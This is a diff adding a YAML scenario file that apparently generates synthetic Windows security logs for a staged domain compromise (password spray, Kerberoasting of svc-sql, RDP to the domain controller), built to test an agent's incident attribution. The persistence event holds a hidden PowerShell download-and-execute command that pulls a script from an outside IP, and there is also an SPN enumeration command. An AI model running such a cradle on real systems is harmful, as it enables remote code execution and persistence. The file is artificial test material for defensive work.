@@ -1,0 +1,202 @@
+version: "1.0"
+generation_seed: 8213
+name: credential-spray-domain-compromise
+description: |
+  A small engineering firm's domain gets compromised in three linked
+  stages: an external credential-spray attack against several employee
+  accounts succeeds against one (diane.foster); from her workstation the
+  attacker enumerates Kerberoastable service accounts and requests a
+  ticket for an over-privileged SQL service account (svc-sql, a
+  pre-existing misconfiguration — it's a member of Domain Admins); after
+  a realistic offline-cracking delay, the attacker uses the cracked
+  credential to log onto the domain controller directly as svc-sql and
+  plants a scheduled task for persistence. Tests whether an agent
+  correctly separates "how they got in" (diane.foster) from "what they
+  did once in" (svc-sql) rather than crediting the sprayed account with
+  the lasting compromise.
+
+environment:
+  description: "Small mechanical/civil engineering firm — a handful of engineers, one sysadmin, a domain controller, and a SQL Server database backing an internal project-tracking application"
+  domain: "palisade.local"
+
+  timezone:
+    default: "America/Denver"
+
+  users:
+    - username: diane.foster
+      full_name: "Diane Foster"
+      email: "diane.foster@palisadeeng.com"
+      persona: analyst
+      primary_system: WS-DFOSTER-01
+      groups: ["engineering"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: mark.chen
+      full_name: "Mark Chen"
+      email: "mark.chen@palisadeeng.com"
+      persona: analyst
+      primary_system: WS-MCHEN-01
+      groups: ["engineering"]
+      enabled: true
+      browsing_intensity: normal
+
+    - username: elena.popov
+      full_name: "Elena Popov"
+      email: "elena.popov@palisadeeng.com"
+      persona: analyst
+      primary_system: WS-EPOPOV-01
+      groups: ["engineering"]
+      enabled: true
+      browsing_intensity: light
+
+    - username: james.whitfield
+      full_name: "James Whitfield"
+      email: "james.whitfield@palisadeeng.com"
+      persona: sysadmin
+      primary_system: WS-JWHITFIELD-01
+      groups: ["it-admins", "domain-admins"]
+      enabled: true
+      browsing_intensity: light
+
+  service_accounts:
+    - svc-sql
+
+  systems:
+    - hostname: WS-DFOSTER-01
+      ip: "10.55.10.21"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: diane.foster
+      services: ["dns-client"]
+
+    - hostname: WS-MCHEN-01
+      ip: "10.55.10.22"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: mark.chen
+      services: ["dns-client"]
+
+    - hostname: WS-EPOPOV-01
+      ip: "10.55.10.23"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: elena.popov
+      services: ["dns-client"]
+
+    - hostname: WS-JWHITFIELD-01
+      ip: "10.55.10.24"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: james.whitfield
+      services: ["dns-client"]
+
+    - hostname: DC-01
+      ip: "10.55.20.10"
+      os: "Windows Server 2022"
+      type: domain_controller
+      services: ["kerberos", "ldap", "dns", "windows-dhcp-server"]
+      roles: ["domain_controller", "dns_server", "dhcp_server"]
+
+    - hostname: SQL-01
+      ip: "10.55.20.20"
+      os: "Windows Server 2019"
+      type: server
+      services: ["mssql"]
+      roles: ["database"]
+
+time_window:
+  start: "2024-09-09T13:00:00Z"
+  duration: "30h"
+  warmup: "8h"
+
+baseline_activity:
+  description: "Ordinary small-firm workday — engineering document work, light web browsing, domain authentication, minimal background noise."
+  intensity: low
+  variation: low
+  suspicious_noise: low
+
+observation_profile: complete
+logon_grace_period: "30m"
+
+storyline:
+  - id: evt-spray-001
+    time: "+2h05m"
+    actor: SYSTEM
+    system: DC-01
+    activity: "External credential-spray attack tries a low-and-slow password against several employee accounts; all fail"
+    events:
+      - type: credential_spray
+        technique: "T1110.003 - Brute Force: Password Spraying"
+        description: "Spray attempt across three employee accounts from one external source, all rejected"
+        target_accounts: [mark.chen, elena.popov, diane.foster]
+        source_ip: "185.220.101.44"
+        interval: "3m"
+        count: 3
+        pattern: spray
+        logon_type: 3
+
+  - id: evt-compromise-002
+    time: "+2h16m"
+    actor: diane.foster
+    system: WS-DFOSTER-01
+    activity: "The spray eventually guesses diane.foster's actual password; a distinct successful logon follows from the same external range"
+    events:
+      - type: logon
+        technique: "T1078 - Valid Accounts"
+        description: "Successful network logon following the spray, same source range as the failed attempts"
+        source_ip: "185.220.101.44"
+        logon_type: 3
+
+  - id: evt-recon-003
+    time: "+2h22m"
+    actor: diane.foster
+    system: WS-DFOSTER-01
+    activity: "Attacker uses the compromised session to enumerate domain accounts with Kerberoastable service principal names"
+    events:
+      - type: process
+        technique: "T1087.002 - Account Discovery: Domain Account"
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName,MemberOf"
+
+  - id: evt-kerberoast-004
+    time: "+2h27m"
+    actor: diane.foster
+    system: WS-DFOSTER-01
+    activity: "Attacker requests a Kerberos service ticket for svc-sql using explicit alternate credentials, consistent with Kerberoasting tooling, then goes quiet — the ticket is cracked offline over the following hours"
+    events:
+      - type: explicit_credentials
+        technique: "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"
+        description: "Explicit-credential ticket request for svc-sql's SPN from diane.foster's compromised session"
+        target_username: svc-sql
+        target_server: DC-01
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+  - id: evt-escalate-005
+    time: "+21h40m"
+    actor: svc-sql
+    system: DC-01
+    activity: "Roughly 19 hours after the ticket request — consistent with offline cracking, not a normal same-session escalation — the attacker uses the cracked svc-sql credential to log onto the domain controller directly, from diane.foster's own workstation rather than externally"
+    events:
+      - type: rdp_session
+        technique: "T1021.001 - Remote Services: Remote Desktop Protocol"
+        description: "svc-sql (a Domain Admins member per a known standing misconfiguration) RDPs directly into the DC"
+        source_ip: "10.55.10.21"
+
+  - id: evt-persistence-006
+    time: "+21h48m"
+    actor: svc-sql
+    system: DC-01
+    activity: "Attacker plants a scheduled task on the domain controller for persistent access, disguised as a routine maintenance task"
+    events:
+      - type: scheduled_task_created
+        technique: "T1053.005 - Scheduled Task/Job: Scheduled Task"
+        task_name: "WindowsDefenderUpdateCheck"
+        task_content: "powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://45.83.221.30/upd.ps1')"
+
+output:
+  logs:
+    - format: windows_event_security
+    - format: windows_event_sysmon
+  destination: scenarios/credential-spray-domain-compromise
+  compression: false
